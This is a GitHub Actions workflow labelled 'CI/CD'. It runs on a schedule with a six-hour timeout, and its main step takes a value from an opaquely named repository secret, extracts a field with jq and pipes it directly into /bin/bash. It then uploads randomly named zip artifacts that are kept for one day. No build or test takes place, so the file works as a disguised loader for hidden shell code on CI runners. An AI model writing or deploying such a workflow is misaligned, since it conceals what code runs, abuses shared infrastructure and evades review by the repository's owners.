name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '5 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Perform
        env:
          hcce2: ${{ secrets.hcce2 }}
        run: |
          printf '%s' "$hcce2" | jq -r .it64416 | /bin/bash
          printf '%s' "$qsaa1877" | jq -r .pcevs50450 | /bin/bash

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rHVcfcw4
          path: "*.zip"
          retention-days: 1
